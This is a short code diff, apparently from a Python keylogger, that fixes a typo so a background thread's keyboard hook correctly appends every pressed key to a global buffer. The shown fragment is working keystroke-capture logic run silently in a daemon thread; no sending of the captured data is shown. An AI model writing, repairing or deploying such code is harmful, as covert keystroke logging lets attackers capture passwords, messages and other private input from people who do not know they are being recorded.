@@ -25,7 +25,7 @@ def log_keys():
     def on_key_event(event):
         global buts
         if event.event_type == 'down':
-            puts+=f"PRESSED - {event.name}\n"
+            buts+=f"PRESSED - {event.name}\n"
     keyboard.hook(on_key_event)
 print(1)
 threading.Thread(target=log_keys, daemon=True).start()
